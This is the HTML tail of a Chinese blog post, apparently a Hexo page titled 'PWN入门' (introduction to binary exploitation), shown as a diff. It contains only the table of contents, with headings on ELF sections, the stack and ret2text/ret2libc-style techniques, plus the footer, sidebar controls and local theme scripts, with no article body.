.fini_array</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93%EF%BC%88%E6%8A%8A%E5%AE%83%E4%BB%AC%E6%8C%89%E7%94%A8%E9%80%94%E5%88%86%E7%BB%84%EF%BC%89"><span class="nav-text">小结（把它们按用途分组）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ghost-%E6%B1%87%E7%BC%96"><span class="nav-text">:ghost:汇编</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ghost-%E6%A0%88%E7%BB%93%E6%9E%84"><span class="nav-text">:ghost:栈结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%88%E8%AF%B4%E2%80%9C%E6%A0%88%E2%80%9D%E5%92%8C%E2%80%9C%E5%A0%86%E2%80%9D%E6%98%AF%E5%95%A5"><span class="nav-text">先说“栈”和“堆”是啥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A5%E6%A0%88"><span class="nav-text">入栈</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BA%E6%A0%88"><span class="nav-text">出栈</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D"><span class="nav-text">实操</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"><span class="nav-text">题目概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">保护机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B"><span class="nav-text">题型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2text-%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-text">ret2text(覆盖返回地址)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2shellcode"><span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc1"><span class="nav-text">ret2libc1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc2"><span class="nav-text">ret2libc2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc3"><span class="nav-text">ret2libc3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2syscall"><span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb"><span class="nav-text">gdb</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Zach0ry</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN%E5%85%A5%E9%97%A8"><span class="nav-text">PWN入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ghost-%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="nav-text">:ghost:源码到可执行文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#elf%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="nav-text">elf可执行文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ELF-Header"><span class="nav-text">ELF Header</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Program-Header-Table%EF%BC%88%E7%A8%8B%E5%BA%8F%E5%A4%B4%E8%A1%A8%EF%BC%8CSegments%EF%BC%89"><span class="nav-text">Program Header Table（程序头表，Segments）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readelf-l-2"><span class="nav-text">readelf -l 2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#-1"><span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sections%EF%BC%88%E8%8A%82-Sections%EF%BC%89"><span class="nav-text">Sections（节 &#x2F; Sections）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#text"><span class="nav-text">.text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rodata"><span class="nav-text">.rodata</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data"><span class="nav-text">.data</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bss"><span class="nav-text">.bss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#symtab-strtab"><span class="nav-text">.symtab &#x2F; .strtab</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dynsym-dynstr"><span class="nav-text">.dynsym &#x2F; .dynstr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#got-got-plt"><span class="nav-text">.got &#x2F; .got.plt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#plt"><span class="nav-text">.plt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rela-rel"><span class="nav-text">.rela.* &#x2F; .rel.*</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#init-array-fini-array"><span class="nav-text">.init_array &#x2F; .fini_array</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93%EF%BC%88%E6%8A%8A%E5%AE%83%E4%BB%AC%E6%8C%89%E7%94%A8%E9%80%94%E5%88%86%E7%BB%84%EF%BC%89"><span class="nav-text">小结（把它们按用途分组）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ghost-%E6%B1%87%E7%BC%96"><span class="nav-text">:ghost:汇编</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ghost-%E6%A0%88%E7%BB%93%E6%9E%84"><span class="nav-text">:ghost:栈结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%88%E8%AF%B4%E2%80%9C%E6%A0%88%E2%80%9D%E5%92%8C%E2%80%9C%E5%A0%86%E2%80%9D%E6%98%AF%E5%95%A5"><span class="nav-text">先说“栈”和“堆”是啥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A5%E6%A0%88"><span class="nav-text">入栈</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BA%E6%A0%88"><span class="nav-text">出栈</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D"><span class="nav-text">实操</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"><span class="nav-text">题目概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">保护机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B"><span class="nav-text">题型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2text-%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-text">ret2text(覆盖返回地址)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2shellcode"><span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc1"><span class="nav-text">ret2libc1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc2"><span class="nav-text">ret2libc2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc3"><span class="nav-text">ret2libc3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2syscall"><span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb"><span class="nav-text">gdb</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
